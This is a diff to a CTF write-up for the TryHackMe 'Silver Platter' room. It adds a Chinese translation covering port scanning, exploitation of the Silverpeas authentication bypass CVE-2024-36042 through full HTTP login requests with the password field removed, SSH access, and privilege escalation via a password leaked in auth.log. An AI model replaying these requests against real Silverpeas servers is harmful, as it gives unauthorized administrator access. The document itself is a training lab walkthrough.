@@ -1,5 +1,136 @@
 # Silver Platter Write-up | 报告
 
+<details>
+  <summary>Click to view in Chinese (点击查看中文版)</summary>
+
+---
+
+这是我对 [Silver Platter](https://tryhackme.com/room/silverplatter) 房间的write-up。这是一个CTF挑战题，我们将深入Web服务器，通过SSH寻找隐藏的flag。
+
+我们需要找到用户flag和root flag。
+
+## 侦察
+
+获取到IP地址后，我使用Nmap工具扫描了开放端口：
+
+```
+nmap -sC -sV MACHINE_IP
+```
+
+<img width="833" height="363" alt="image" src="https://github.com/user-attachments/assets/2596132f-2d21-4244-b4f9-6fb1c85ca167" />
+
+我们发现了三个开放端口：**22**（SSH）、**80**（HTTP）、**8080**（HTTP-PROXY）。让我们查看一下Web服务器：
+
+`http://MACHINE_IP:80` 或直接 `http://MACHINE_IP`
+
+这是该公司的网站，我们可以浏览4个选项卡："Intro"、"Work"、"About"和"Contact"。
+
+最有趣的选项卡是"Contact"。现在我们知道了在**Silverpeas**服务上有一个名为"scr1ptkiddy"的用户名。
+
+然后我检查了8080端口：
+
+`http://MACHINE_IP:8080`
+
+它返回了一个错误。但这并不意味着没有更多内容。我们知道Silverpeas服务，来看看8080端口是否处理它：
+
+`http://MACHINE_IP:8080/silverpeas`
+
+我们被重定向到了登录页面！我立刻注意到了"Give me a new password"按钮，并使用"scr1ptkiddy"用户名尝试了一下，但没有任何帮助或提示。
+
+我们唯一知道的就是"scr1ptkiddy"这个用户名存在于Silverpeas上。没有更多信息了。我们必须找到该服务的漏洞，以便继续推进。
+
+## 漏洞利用
+
+我在Google上搜索了"silverpeas vulnerabilities"，找到了**CVE-2024-36042 "Silverpeas authentication bypass"**。这正是我们需要的，因为我们有用户名，而这个CVE允许我们在没有密码的情况下登录。
+
+### CVE-2024-36042 描述：
+Silverpeas 6.3.5之前的版本存在身份验证绕过漏洞，通过在AuthenticationServlet中省略Password字段，通常可为未经身份验证的用户提供超级管理员权限。
+
+这太完美了。让我们打开Burp Suite，访问 `http://MACHINE_IP:8080/silverpeas`，然后输入用户名"scr1ptkiddy"，在**开启拦截**的情况下点击"LOG IN"，这样我们就能捕获请求并尝试利用该漏洞。
+
+```
+POST /silverpeas/AuthenticationServlet HTTP/1.1
+Host: 10.48.175.44:8080
+Origin: http://10.48.175.44:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp
+
+Login=scr1ptkiddy&Password=&DomainId=0
+```
+
+我们需要**删除请求末尾的password字段**，像这样：
+
+```
+POST /silverpeas/AuthenticationServlet HTTP/1.1
+Host: 10.48.175.44:8080
+Origin: http://10.48.175.44:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp
+
+Login=scr1ptkiddy&DomainId=0
+```
+
+然后发送请求，再关闭拦截。
+
+现在我们已作为scr1ptkiddy登录到Silverpeas。
+
+在"**Directory**"选项卡中，我们有三个用户卡片：scr1ptkiddy、Manager和Administrator。在这里我们可以看到Administrator的本地用户：`silveradmin@localhost`。
+
+我检查了所有目录和消息，但没有找到任何有用的信息。现在我们需要注销，然后尝试以Silver Admin身份登录：
+
+```
+POST /silverpeas/AuthenticationServlet HTTP/1.1
+Host: 10.48.175.44:8080
+Origin: http://10.48.175.44:8080
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+Referer: http://10.48.175.44:8080/silverpeas/defaultLogin.jsp
+
+Login=SilverAdmin&DomainId=0
+```
+（**用户名中不要使用空格**）
+
+现在我们已经以Administrator身份登录。让我们检查消息……在"Mes notifications"中的"Notifications envoyées"选项卡中，我们看到一条带有"SSH"标题的消息。
+
+它为我们提供了SSH的用户名和密码。让我们深入进去。
+
+```
+ssh tim@MACHINE_IP
+```
+
+然后复制粘贴密码。
+
+现在，当我们登录进去后，在 `/home/tim` 中输入 `ls` 找到 `user.txt`。这就是用户flag。
+
+之后我发现了其他用户，如"tyler"、"ssm-user"、"ubuntu"，尝试切换到他们的目录，但没有权限。
+
+我们还可以搜索日志，这可能会非常有用。输入 `ls /var/log`：
+
+`auth.log` 文件是最有趣的。让我们打开所有文件。
+
+`auth.log.2` 中包含tyler用户的密码，位于DB_PASSWORD字段中。让我们切换到tyler，输入 `su tyler` 并复制粘贴我们找到的密码。
+
+让我们通过运行 `sudo -l` 来检查tyler的权限：
+
+`(ALL : ALL) ALL` 这一行意味着我们拥有完整的管理员权限。我们可以读取任何文件。让我们寻找root的flag：
+
+```
+sudo cat /root/root.txt
+```
+
+输出结果显示了root的flag。
+
+## 总结
+
+在这个房间里，我学到了如何：
+* 搜索**CVE漏洞**。
+
+  </details>
+
+---
+
 This is my write-up for the [Silver Platter](https://tryhackme.com/room/silverplatter) room. This is a CTF challenge where we will dive into the web server to find hidden flags via SSH.
 
 We have to find user's flag and root's flag.
@@ -11,6 +142,8 @@ After getting an IP address, I scanned it to search for open ports using Nmap to
 ```
 nmap -sC -sV MACHINE_IP
 ```
+
+<img width="833" height="363" alt="image" src="https://github.com/user-attachments/assets/2596132f-2d21-4244-b4f9-6fb1c85ca167" />
 
 We got three open ports: **22** (SSH), **80** (HTTP), **8080** (HTTP-PROXY). Let's see the web server:
 
